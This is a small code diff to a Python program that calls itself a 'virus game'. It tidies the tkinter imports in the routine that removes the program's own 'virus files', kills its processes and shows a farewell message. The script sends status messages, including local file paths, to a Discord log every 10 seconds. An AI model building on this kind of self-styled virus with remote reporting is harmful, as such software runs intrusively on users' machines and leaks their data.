@@ -1,6 +1,7 @@
 import os, subprocess, sys, time
 import requests
-import tkinter
+import tkinter as tk
+from tkinter import messagebox
 
 home_dir = os.path.expanduser("~")
 appdata = os.environ['APPDATA']
@@ -59,22 +60,21 @@ def check_resign():
                         if os.path.exists(file_path):
                             send2trash.send2trash(file_path)
                             log_to_discord(f"Moved {file_path} to recycle bin.")
-                    root = tkinter.Tk()
+                    root = tk.Tk()
                     root.withdraw()
-                    tkinter.messagebox.showinfo("Success", "All virus files were moved into bin.\nRestart your computer to stop all remaining virus processes.")
+                    messagebox.showinfo("Success", "All virus files were moved into bin.\nRestart your computer to stop all remaining virus processes.")
                 except ImportError:
-                    # if tkinter.messagebox.askquestion("Warning: package missing", f"Warning: package send2trash is missing. Do you want to delete all virus files permanently? Make sure you don't accidentally delete your files.\nFile list:{'\n'.join([i[1] for i in files_to_backup])}\n\nContinue deleting?"):
                     os.makedirs(os.path.join(home_dir, "Desktop", "trash"))
                     trash_dir = os.path.join(home_dir, "Desktop", "trash")
                     for file_path in files_to_backup:
                         if os.path.exists(file_path):
                             os.rename(file_path, os.path.join(trash_dir, os.path.basename(file_path)))
                             log_to_discord(f"Moved {file_path} moved to Desktop/trash.")
-                    root = tkinter.Tk()
+                    root = tk.Tk()
                     root.withdraw()
-                    tkinter.messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
+                    messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
                 finally:
-                    tkinter.messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
+                    messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
                     kill_other_processes()
                     return True
             else:
@@ -98,5 +98,3 @@ while True:
         except Exception as e:
             log_to_discord(f"Error: {e}")
     time.sleep(10)
-
-
